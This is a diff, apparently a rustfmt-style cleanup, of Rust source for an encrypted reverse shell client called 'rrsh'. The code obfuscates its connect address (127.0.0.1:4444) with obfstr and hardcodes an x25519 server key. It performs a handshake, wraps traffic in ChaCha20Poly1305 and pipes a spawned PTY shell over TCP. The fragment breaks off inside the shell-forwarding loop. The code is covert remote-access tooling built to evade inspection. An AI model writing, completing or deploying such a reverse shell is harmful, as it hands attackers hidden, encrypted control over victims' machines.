@@ -2,9 +2,7 @@ use futures::{SinkExt, StreamExt};
 use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
 use std::io::{Read, Write};
 use std::time::Duration;
-use tokio::{
-    net::TcpStream as TokioTcpStream,
-};
+use tokio::net::TcpStream as TokioTcpStream;
 use tokio_util::codec::{FramedRead, FramedWrite};
 
 use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
@@ -12,7 +10,7 @@ use obfstr::obfstr;
 
 mod codec;
 use codec::EncryptedCodec;
-use rrsh::{do_handshake, HandshakeRole};
+use rrsh::{HandshakeRole, do_handshake};
 
 #[tokio::main]
 async fn main() {
@@ -60,20 +58,23 @@ fn shell_setup() -> Result<portable_pty::PtyPair, Box<dyn std::error::Error>> {
         .slave
         .spawn_command(_cmd)
         .map_err(|e| format!("failed to spawn: {}", e))?;
-     Ok(pty_pair)
+    Ok(pty_pair)
 }
 
 async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
     let mut stream = TokioTcpStream::connect(obfstr!("127.0.0.1:4444")).await?;
-    let client_role = HandshakeRole::Client { 
-        server_public_key: x25519_dalek::PublicKey::from(
-            [152, 243, 212, 54, 136, 190, 128, 28, 24, 202, 202, 176, 95, 52, 236, 69, 218, 35, 112, 10, 137, 101, 212, 224, 14, 168, 82, 49, 127, 203, 238, 105]
-        )
+    let client_role = HandshakeRole::Client {
+        server_public_key: x25519_dalek::PublicKey::from([
+            152, 243, 212, 54, 136, 190, 128, 28, 24, 202, 202, 176, 95, 52, 236, 69, 218, 35, 112,
+            10, 137, 101, 212, 224, 14, 168, 82, 49, 127, 203, 238, 105,
+        ]),
     };
     let (key_rx, key_tx) = do_handshake(&mut stream, client_role).await?;
 
-    let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_tx).map_err(|e| format!("cipher init error: {}", e))?;
-    let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_rx).map_err(|e| format!("cipher init error: {}", e))?;
+    let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_tx)
+        .map_err(|e| format!("cipher init error: {}", e))?;
+    let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_rx)
+        .map_err(|e| format!("cipher init error: {}", e))?;
 
     let (tcp_reader, tcp_writer) = tokio::io::split(stream);
     let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
@@ -83,11 +84,11 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
 
     let mut pty_reader = pty_pair.master.try_clone_reader()?;
     let mut pty_writer = pty_pair.master.take_writer()?;
-    
+
     let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
-    
+
     tokio::task::spawn_blocking(move || {
-        // This is actually quite suboptimial and I only need this because of
+        // This is actually suboptimial and I only need this because of
         // the sync interface of portable-pty - this is good for potential Windows
         // support though...
         let mut buf = [0u8; 4096];
